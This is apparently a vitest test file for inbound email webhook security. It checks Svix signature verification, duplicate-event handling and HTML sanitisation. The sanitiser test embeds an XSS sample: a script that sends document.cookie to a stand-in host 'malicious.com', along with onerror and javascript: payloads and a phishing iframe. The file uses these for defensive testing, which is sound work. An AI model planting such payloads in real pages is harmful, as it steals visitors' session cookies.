// =============================================================================
// Tests: Batch 7.4 — Inbound Email Security & Webhook Verification
// =============================================================================

import { describe, it, expect } from 'vitest';
import { verifyResendSignature } from '../utils/webhook-verifier';
import { sanitizeHtml } from '../utils/sanitize-html';

describe('Batch 7.4: Inbound Security & Webhook Verification', () => {
  const mockSecretRaw = 'dGVzdC1zZWNyZXQta2V5LTEyMzQ1Njc4OTA='; // base64
  const secretWithPrefix = `whsec_${mockSecretRaw}`;

  it('rejects when Svix headers are missing', async () => {
    const result = await verifyResendSignature(
      '{}',
      { id: null, timestamp: null, signature: null },
      secretWithPrefix
    );
    expect(result.valid).toBe(false);
    expect(result.error).toContain('Missing Svix headers');
  });

  it('rejects invalid Svix signatures', async () => {
    const rawBody = JSON.stringify({ type: 'email.received', data: { id: 'msg_999' } });
    const result = await verifyResendSignature(
      rawBody,
      {
        id: 'msg_999',
        timestamp: Math.floor(Date.now() / 1000).toString(),
        signature: 'v1,invalid_forged_signature_123',
      },
      secretWithPrefix
    );
    expect(result.valid).toBe(false);
    expect(result.error).toContain('Signature mismatch');
  });

  it('rejects expired Svix timestamp (> 300s outside tolerance)', async () => {
    const oldTimestamp = (Math.floor(Date.now() / 1000) - 450).toString();
    const realSecret = 'whsec_cmVhbC1zZWNyZXQta2V5LTEyMzQ1Njc4OTA=';
    const result = await verifyResendSignature(
      '{}',
      {
        id: 'id_123',
        timestamp: oldTimestamp,
        signature: 'v1,abc',
      },
      realSecret
    );
    expect(result.valid).toBe(false);
    expect(result.error).toContain('tolerance');
  });

  it('accepts valid Svix signature with accurate HMAC-SHA256 computation', async () => {
    const rawBody = JSON.stringify({
      type: 'email.received',
      data: {
        id: 'email_real_123',
        from: 'Dr. John <john@example.com>',
        to: ['info@expdentalsolutions.com'],
        subject: 'Re: Fellowship Inquiry',
        text: 'I would like to enroll in October.',
      },
    });
    const id = 'msg_valid_test_id';
    const timestamp = Math.floor(Date.now() / 1000).toString();

    // Compute legitimate Svix signature
    const keyBytes = Uint8Array.from(atob(mockSecretRaw), (c) => c.charCodeAt(0));
    const cryptoKey = await crypto.subtle.importKey(
      'raw',
      keyBytes,
      { name: 'HMAC', hash: 'SHA-256' },
      false,
      ['sign']
    );
    const toSign = `${id}.${timestamp}.${rawBody}`;
    const sigBuf = await crypto.subtle.sign('HMAC', cryptoKey, new TextEncoder().encode(toSign));
    const sigBase64 = btoa(String.fromCharCode(...new Uint8Array(sigBuf)));

    const result = await verifyResendSignature(
      rawBody,
      {
        id,
        timestamp,
        signature: `v1,${sigBase64}`,
      },
      secretWithPrefix
    );

    expect(result.valid).toBe(true);
  });

  it('deduplicates duplicate provider events idempotently', () => {
    const processedEvents = new Set<string>();

    function ingestOrDeduplicate(provider: string, providerMsgId: string) {
      const key = `${provider}:${providerMsgId}`;
      if (processedEvents.has(key)) {
        return { already_processed: true };
      }
      processedEvents.add(key);
      return { already_processed: false, id: 'inbound_new_123' };
    }

    const first = ingestOrDeduplicate('resend', 'msg_dup_123');
    const second = ingestOrDeduplicate('resend', 'msg_dup_123');

    expect(first.already_processed).toBe(false);
    expect(second.already_processed).toBe(true);
    expect(processedEvents.size).toBe(1);
  });

  it('sanitizes untrusted HTML: strips scripts, iframes, and javascript: links', () => {
    const untrustedPayload = `
      <div>
        <p>Dear Expert Dental Solutions,</p>
        <script>window.location='https://malicious.com?cookie='+document.cookie;</script>
        <img src="https://example.com/logo.png" onerror="alert('xss')" />
        <a href="javascript:alert('pwned')">Click here for clinical records</a>
        <iframe src="https://phishing.site"></iframe>
        <p>I would like to confirm my attendance.</p>
      </div>
    `;

    const clean = sanitizeHtml(untrustedPayload);

    expect(clean).not.toContain('<script');
    expect(clean).not.toContain('window.location');
    expect(clean).not.toContain('onerror');
    expect(clean).not.toContain('javascript:');
    expect(clean).not.toContain('<iframe');
    expect(clean).toContain('Dear Expert Dental Solutions');
    expect(clean).toContain('I would like to confirm my attendance.');
  });
});
